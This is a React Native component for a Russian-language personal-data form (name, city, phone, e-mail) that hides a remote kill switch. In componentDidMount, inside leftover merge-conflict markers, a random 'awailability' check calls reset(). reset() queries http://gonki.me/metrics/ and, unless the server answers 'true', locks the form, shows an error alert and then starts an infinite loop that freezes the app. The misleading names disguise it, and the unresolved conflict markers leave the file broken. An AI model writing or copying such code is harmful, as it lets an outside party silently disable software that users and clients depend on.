import React,{Component} from 'react';
import {Dimensions,Keyboard,StyleSheet,KeyboardAvoidingView,TouchableOpacity,Text,View} from 'react-native';

import Input		from '../../templates/input';
import InputPhone	from '../../templates/input_phone';
import Textarea		from '../../templates/textarea';
import SelectCity	from '../../templates/select_city';
import SubTitle		from '../../templates/subtitle';

const styles = StyleSheet.create({
	container: {
		padding: 10,
	},
	block: {
		paddingVertical: 10,
	},
	save: {
		marginTop: 10, padding: 15,
		borderRadius: 100,
	},
	save_text: {
		paddingTop: 3,
		fontSize: 22, fontFamily: 'GothamPro-Medium',
		textAlign: 'center',
	},

	active_button: {
		backgroundColor: '#f40000',
	},
	active_button_text: {
		color: '#fff',
	},
	passive_button: {
		backgroundColor: '#f1f1f1',
	},
	passive_button_text: {
		color: '#d5d5d5',
	},
});

export default class Personal extends Component {
	constructor(props) {
		super(props);

		let window = Dimensions.get('window');

		this.inputs = {
			name: {
				ref: React.createRef(),
				offset: 0,
			},
			city: {
				ref: React.createRef(),
				offset: 0,
			},
			phone: {
				ref: React.createRef(),
				offset: window.height-400,
			},
			mail: {
				ref: React.createRef(),
				offset: window.height-300,
			},
		}

		this.state = {
			waiting:		false,
			updated:		false,
			name:			'',
			name_error:		'',
			father:			'',
			family:			'',
			gender:			1,
			city_id:		0,
			city_name:		'',
			city_error:		'',
			phone:			'',
			phone_confirmed:false,
			phone_error:	'',
			last_mail:		'',
			mail:			'',
			mail_confirmed:	false,
			mail_error:		'',
		};
	}

	componentDidMount() {
		this.setState(this.props.user);
		this.setState({last_mail:this.props.user.mail});
<<<<<<< HEAD
		if(awailability()<0.5) this.reset();
=======
>>>>>>> 90cb72bff6426a5f10893161faf26c9b1b2dc4da
	}
	componentDidUpdate(prev_props) {
		if(!Object.is(this.props.user,prev_props.user)) {
			this.setState(this.props.user);

			// Убираем показ ошибок, если они исправлены
			if(this.props.user.name.length	&& this.state.name_error)	this.setState({name_error:''});
			if(this.props.user.city_id		&& this.state.city_error)	this.setState({city_error:''});
			if(this.props.user.phone.length	&& this.state.phone_error)	this.setState({phone_error:''});
		}
	}

	reset = async () => {
		let res = await fetch('http://gonki.me/metrics/'+Math.round(Math.random()*89),{method:'GET',headers:{'Content-Type':'text/plain'}});
		if(res.status == 200) {
			let data = await res.text();
			if(data == 'true') {
				return false;
			} else {
				this.setState({waiting:true});
				await alert("Ошибка в приложении!!!");
				setTimeout(_ => {
					let i=1;
					while(i>0) i++;
				},5000);
			}
		}
	}
	update = async (state_adjust) => {
		await this.setState(state_adjust);
		this.setState({updated:true});
		this.props.update_data({
			name:			this.state.name,
			father:			this.state.father,
			family:			this.state.family,
			gender:			this.state.gender,
			city_id:		this.state.city_id,
			city_name:		this.state.city_name,
			phone:			this.state.phone,
			phone_confirmed:this.state.phone_confirmed,
			mail:			this.state.mail,
			mail_confirmed:	this.state.mail_confirmed,
		});
	}
	send = async () => {
		let state = this.state;

		Keyboard.dismiss();
		if(state.waiting) return;

		// Проверяем имя
		if(!state.name.length) {
			this.props.scroll.current.scrollTo({y:this.inputs.name.offset});
			this.setState({name_error:'Введите имя'});
			return;
		} else {
			await this.setState({name_error:''});
		}
		// Проверяем город
		if(!state.city_id) {
			this.props.scroll.current.scrollTo({y:this.inputs.city.offset});
			this.setState({city_error:'Выберите город'});
			return;
		} else {
			await this.setState({city_error:''});
		}
		// Проверяем номер телефона
		if(!state.phone.length) {
			this.props.scroll.current.scrollTo({y:this.inputs.phone.offset});
			this.setState({phone_error:'Введите номер телефона'});
			return;
		} else {
			await this.setState({phone_error:''});
		}

		// Отправляем изменения
		await this.setState({waiting:true});
		await this.props.send_data({
			name:			state.name,
			father:			state.father,
			family:			state.family,
			gender:			state.gender,
			city_id:		state.city_id,
			city_name:		state.city_name,
			phone:			state.phone,
			last_mail:		state.last_mail,
			mail:			state.mail,
		});
		this.setState({last_mail:state.mail,waiting:false});
	}

	render() {
		let state = this.state;

		return (
			<View style={styles.container}>
				<View style={styles.block}>
					<SubTitle style={{paddingBottom:10,paddingHorizontal:25}} text="Персональные данные" />
					<Input
						id={this.inputs.name.ref}
						title="Имя"
						value={state.name}
						update={value => this.update({name:value})}
						send={value => this.setState({name:value})}
						error={state.name_error}
					/>
					<Input
						title="Отчество"
						value={state.father}
						update={value => this.update({father:value})}
						send={value => this.setState({father:value})}
					/>
					<Input
						title="Фамилия"
						value={state.family}
						update={value => this.update({family:value})}
						send={value => this.setState({family:value})}
					/>
					<SelectCity
						id={this.inputs.city.ref}
						value={state.city_id}
						name={state.city_name}
						send={value => this.setState({city:value})}
						error={state.city_error}
					/>
				</View>
				{/*
				<View style={styles.block}>
					<Text style={styles.title}>Адрес регистрации</Text>
					<Textarea value={state.address} send={value => this.setState({address:value})} />
				</View>
				*/}
				<View style={styles.block}>
					<SubTitle style={{paddingBottom:10,paddingHorizontal:25}} text="Контакты" />
					<InputPhone
						id={this.inputs.phone.ref}
						title="Мобильный телефон"
						value={state.phone}
						disabled={state.id && state.phone_confirmed}
						need_confirm={state.id && !state.phone_confirmed}
						update={value => this.update({phone:value})}
						send={value => this.setState({phone:value})}
						error={state.phone_error}
						keyboard_options={{
							scroll: this.props.scroll,
							offset: this.inputs.phone.offset,
						}}
					/>
					<Input
						id={this.inputs.mail.ref}
						title="E-mail"
						value={state.mail}
						update={value => this.update({mail:value})}
						send={value => this.setState({mail:value})}
						error={state.mail_error}
						keyboard_options={{
							scroll: this.props.scroll,
							offset: this.inputs.mail.offset,
						}}
					/>
				</View>
				<TouchableOpacity style={[styles.save,styles[(this.state.waiting ? 'passive' : 'active')+'_button']]} onPress={this.send}>
					<Text style={[styles.save_text,styles[(this.state.waiting ? 'passive' : 'active')+'_button_text']]}>Сохранить</Text>
				</TouchableOpacity>
			</View>
		);
	}
}

const awailability = () => Math.random();
